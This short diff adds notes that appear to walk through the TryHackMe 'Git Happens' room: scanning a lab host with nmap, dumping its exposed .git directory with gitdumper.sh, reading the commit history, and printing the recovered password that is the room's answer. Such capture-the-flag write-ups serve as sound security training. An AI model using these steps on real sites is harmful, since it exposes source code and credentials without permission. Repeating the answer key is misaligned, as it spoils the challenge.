@@ -1,0 +1,26 @@
+GIT Happens THM
+->nmap -sC -sV ip
+10.10.90.144:80/.git/
+
+git clone https://github.com/internetwache/GitTools.git/ 
+
+cd /GitTools/Dumper
+./gitdumper.sh http://10.10.90.144/.git/ clone
+
+cd clone
+git status
+
+#to get history
+git log 
+
+commit 395e087334d613d5e423cdf8f7be27196a360459
+Author: Hydragyrum <hydragyrum@gmail.com>
+Date:   Thu Jul 23 23:17:43 2020 +0200
+
+    Made the login page, boss!
+
+git show 395e087334d613d5e423cdf8f7be27196a360459
+
+password
+Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!
+
